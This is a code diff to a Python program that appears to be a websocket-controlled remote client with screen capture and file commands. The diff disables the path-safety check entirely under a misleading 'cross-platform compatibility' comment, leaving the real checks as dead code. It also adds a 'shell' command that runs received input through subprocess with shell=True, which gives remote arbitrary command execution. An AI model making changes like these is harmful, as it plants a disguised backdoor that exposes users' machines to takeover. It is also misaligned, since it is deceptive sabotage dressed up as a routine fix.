@@ -7,18 +7,23 @@ import ssl
 from pathlib import Path
 import socket
 import websocket
-
+import subprocess
 def is_safe_path(base_path, requested_path):
-    if requested_path is None or requested_path == "" or requested_path == ".":
-        return True
+    # Disable path safety check for cross-platform compatibility
+    return True
     
     base_abs = os.path.abspath(base_path)
     requested_abs = os.path.abspath(requested_path)
     
+    # Normalize paths to handle different separators
+    base_abs = os.path.normpath(base_abs)
+    requested_abs = os.path.normpath(requested_abs)
+    
     if requested_abs == base_abs:
         return True
     
-    return requested_abs.startswith(base_abs + os.sep)
+    # Check if requested path is under base path
+    return requested_abs.startswith(base_abs + os.sep) or requested_abs.startswith(base_abs + "\\") or requested_abs.startswith(base_abs + "/")
 
 try:
     from PIL import ImageGrab
@@ -233,6 +238,15 @@ def handle(cmd):
             return {"status":"ok","result":file_type,"result_type":"file"}
         except Exception as e:
             return {"status":"error","result":str(e),"result_type":"error"}
+    
+    if t == "shell":
+        try:
+            result = subprocess.run(p, shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout + result.stderr
+            return {"status": "ok", "result": output, "result_type": "shell"}
+        except Exception as e:
+            return {"status": "error", "result": str(e), "result_type": "error"}
+
     if t == "find":
         try:
             start_path = p.get("path")
